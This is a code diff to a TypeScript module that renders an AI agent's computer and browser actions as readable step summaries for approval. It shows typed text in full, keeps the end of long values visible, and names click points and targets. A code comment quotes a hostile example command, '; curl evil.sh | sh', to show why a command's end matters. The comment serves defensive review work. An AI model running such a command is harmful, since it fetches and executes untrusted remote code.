@@ -8,9 +8,21 @@ import { keyCaps, keyPlatformOf, type KeyPlatform } from "./keys.js";
 const MAX_VALUE = 120;
 const MAX_FIELDS = 6;
 
+/**
+ * A value on one line, cut to fit by its middle so its end always shows: a
+ * command's last part ("; curl evil.sh | sh") is where a harmless start
+ * hides what it does. A line break or tab in it is said as its key, never
+ * folded into a space.
+ */
 function truncate(s: string, n = MAX_VALUE): string {
-  const t = s.replace(/\s+/g, " ").trim();
-  return t.length <= n ? t : `${t.slice(0, n - 1)}…`;
+  const t = s
+    .replace(/\r?\n/g, " ⏎ ")
+    .replace(/\t/g, " ⇥ ")
+    .replace(/[ \f\v]+/g, " ")
+    .trim();
+  if (t.length <= n) return t;
+  const tail = Math.floor((n - 1) * 0.4);
+  return `${t.slice(0, n - 1 - tail)}…${t.slice(t.length - tail)}`;
 }
 
 function parseArgs(args: string | Record<string, unknown>): Record<string, unknown> {
@@ -74,12 +86,8 @@ const COMPUTER_CLICKS: Record<string, string> = {
   triple_click: "Triple-click",
 };
 
-/** At most this many lines in a step's summary; the rest are counted. */
-const MAX_PARTS = 4;
 /** A single action this short may follow the step's purpose, in parentheses. */
 const SHORT_MECHANICS = 24;
-/** Typed words in a step are cut here; the details hold them whole. */
-const MAX_TYPED = 48;
 
 const lowerFirst = (s: string): string => s.charAt(0).toLowerCase() + s.slice(1);
 const upperFirst = (s: string): string => s.charAt(0).toUpperCase() + s.slice(1);
@@ -106,8 +114,31 @@ interface Part {
 }
 
 const words = (text: string): Part => ({ pieces: [{ text }], raw: undefined });
-/** Typed words, quoted and cut, so a long paste stays one line. */
-const quoted = (v: unknown): string => `“${typeof v === "string" ? truncate(v, MAX_TYPED) : fmtVal(v)}”`;
+
+/**
+ * Typed words as a step shows them: every one, in quotes, a quote inside
+ * them escaped so they cannot read as the end of the step and the start of
+ * another, and a line break or tab as the key it presses.
+ */
+function typed(v: unknown): StepLine {
+  const text = typeof v === "string" ? v : fmtVal(v);
+  const pieces: StepLine = [{ text: "“" }];
+  for (const part of text.split(/(\r?\n|\t)/)) {
+    if (part === "\n" || part === "\r\n") pieces.push({ key: "⏎" });
+    else if (part === "\t") pieces.push({ key: "Tab" });
+    else if (part) pieces.push({ text: part.replace(/[“”"\\]/g, (q) => `\\${q}`) });
+  }
+  pieces.push({ text: "”" });
+  return pieces;
+}
+
+/** A step of words around typed words. */
+const withTyped = (before: string, v: unknown, after = ""): Part => ({ pieces: tidy([{ text: before }, ...typed(v), ...(after ? [{ text: after }] : [])]), raw: undefined });
+
+/** A point on the screen, as a click names it when it has nothing better: "at 412, 220". */
+function at(coordinate: unknown): string {
+  return Array.isArray(coordinate) && coordinate.length >= 2 && coordinate.every((c) => typeof c === "number") ? ` at ${coordinate[0]}, ${coordinate[1]}` : "";
+}
 
 /** A press of keys, as caps: nothing to press reads as "Press" alone. */
 function press(text: unknown, platform: KeyPlatform): Part {
@@ -188,12 +219,9 @@ function sentence(lines: StepLine[]): string {
   return lines.map((l, i) => (i === 0 ? stepText(l) : following(l))).join(", ");
 }
 
-/** The parts of one step as a line: the first few lines said and the rest counted, so a long run stays readable. */
-function joinParts(parts: Part[], cap = MAX_PARTS): string {
-  const lines = linesOf(parts);
-  const said = lines.length > cap ? lines.slice(0, cap - 1) : lines;
-  const rest = lines.length - said.length;
-  return rest ? `${sentence(said)} and ${rest} more` : sentence(said);
+/** The parts of one step as a line: every one, since a yes is given for all of them. */
+function joinParts(parts: Part[]): string {
+  return sentence(linesOf(parts));
 }
 
 /**
@@ -210,13 +238,14 @@ function withIntent(intent: unknown, parts: Part[]): string {
   return only && only.length <= SHORT_MECHANICS ? `${head} (${following(lines[0]!)})` : head;
 }
 
-/** One computer action as words. Coordinates name nothing the owner can see, so they are left out. */
+/** One computer action as words, naming where it lands by its point on the screen. */
 function computerAction(a: Record<string, unknown>, platform: KeyPlatform): Part {
   const action = typeof a.action === "string" ? a.action : "";
   const click = COMPUTER_CLICKS[action];
   if (click) {
+    const where = `${click}${at(a.coordinate)}`;
     const held = typeof a.text === "string" && a.text ? keyCaps(a.text.replace(/\s+/g, "+"), platform) : [];
-    return held.length ? { pieces: [{ text: `${click} holding ` }, ...spaced(held)], raw: undefined } : words(click);
+    return held.length ? { pieces: [{ text: `${where} holding ` }, ...spaced(held)], raw: undefined } : words(where);
   }
   switch (action) {
     case "":
@@ -226,13 +255,16 @@ function computerAction(a: Record<string, unknown>, platform: KeyPlatform): Part
     case "zoom":
       return words("Look closer at part of the screen");
     case "mouse_move":
-      return words("Move the pointer");
-    case "left_click_drag":
-      return words("Drag");
+      return words(`Move the pointer${at(a.coordinate).replace(" at", " to")}`);
+    case "left_click_drag": {
+      const from = at(a.start_coordinate).replace(" at", " from");
+      const to = at(a.coordinate).replace(" at", " to");
+      return words(`Drag${from}${to}`);
+    }
     case "scroll":
-      return words(`Scroll ${fmtVal(a.scroll_direction ?? "down")}${typeof a.scroll_amount === "number" ? ` ${a.scroll_amount}` : ""}`);
+      return words(`Scroll ${fmtVal(a.scroll_direction ?? "down")}${typeof a.scroll_amount === "number" ? ` ${a.scroll_amount}` : ""}${at(a.coordinate)}`);
     case "type":
-      return words(`Type ${quoted(a.text)}`);
+      return withTyped("Type ", a.text);
     case "key":
       return press(a.text, platform);
     case "wait":
@@ -254,19 +286,31 @@ function computerStep(tool: string, a: Record<string, unknown>, platform: KeyPla
   return itself(tool.slice("computer.".length)) || "Use the computer";
 }
 
-/** A browser.act target in words: the text it names, a selector as written, nothing for a @ref. */
+/**
+ * What a browser.act step acts on, in words, always something: its label
+ * ("“Submit”"), its role and ref ("button e5"), a ref alone ("element e5"),
+ * or a selector as written.
+ */
 function targetWords(v: unknown): string {
-  const t = v && typeof v === "object" ? ((v as Record<string, unknown>)["target"] ?? (v as Record<string, unknown>)["selector"]) : v;
-  if (typeof t !== "string" || !t || t.startsWith("@")) return "";
+  const o = v && typeof v === "object" && !Array.isArray(v) ? (v as Record<string, unknown>) : undefined;
+  const label = typeof o?.["label"] === "string" ? o["label"] : typeof o?.["name"] === "string" ? o["name"] : undefined;
+  if (label) return ` “${truncate(label, 40)}”`;
+  const t = o ? (o["target"] ?? o["selector"]) : v;
+  if (typeof t !== "string" || !t) return "";
+  if (t.startsWith("@")) return ` ${typeof o?.["role"] === "string" ? o["role"] : "element"} ${t.slice(1)}`;
   const text = /^text=(.+)$/.exec(t)?.[1] ?? /:has-text\(['"](.+)['"]\)/.exec(t)?.[1];
   return text ? ` “${truncate(text, 40)}”` : ` ${truncate(t, 40)}`;
 }
 
-/** One browser.act step as words. */
+/** One browser.act step as words, naming what it acts on. */
 function browserStep(s: Record<string, unknown>, platform: KeyPlatform): Part {
   const key = Object.keys(s)[0] ?? "";
   const v = s[key];
   const field = (name: string): unknown => (v && typeof v === "object" ? (v as Record<string, unknown>)[name] : undefined);
+  const into = (): string => {
+    const t = targetWords(v);
+    return t ? ` into${t}` : "";
+  };
   switch (key) {
     case "click":
       return words(`Click${targetWords(v)}`);
@@ -276,17 +320,21 @@ function browserStep(s: Record<string, unknown>, platform: KeyPlatform): Part {
       return words(`Right-click${targetWords(v)}`);
     case "hover":
       return words(`Point at${targetWords(v) || " something"}`);
-    case "drag":
-      return words("Drag");
+    case "drag": {
+      const from = targetWords(field("from"));
+      const to = targetWords(field("to"));
+      return words(`Drag${from ? `${from}` : ""}${to ? ` to${to}` : ""}`);
+    }
     case "fill":
-      return words(`Fill in ${quoted(field("text"))}`);
+      return withTyped("Fill in ", field("text"), into());
     case "type":
-      return words(`Type ${quoted(field("text"))}`);
+      return withTyped("Type ", field("text"), into());
     case "press":
       return press(v, platform);
     case "select": {
       const values = field("values");
-      return words(`Choose ${fmtVal(Array.isArray(values) ? values.join(", ") : values)}`);
+      const t = targetWords(v);
+      return words(`Choose ${fmtVal(Array.isArray(values) ? values.join(", ") : values)}${t ? ` in${t}` : ""}`);
     }
     case "check":
       return words(`Tick${targetWords(v)}`);
@@ -299,7 +347,7 @@ function browserStep(s: Record<string, unknown>, platform: KeyPlatform): Part {
     case "go":
       return words(v === "reload" ? "Reload the page" : `Go ${fmtVal(v)}`);
     case "wait":
-      return words(typeof field("text") === "string" ? `Wait for ${quoted(field("text"))}` : "Wait");
+      return typeof field("text") === "string" ? withTyped("Wait for ", field("text")) : words("Wait");
     case "dialog":
       return words(v === "accept" ? "Accept the dialog" : "Dismiss the dialog");
     case "":
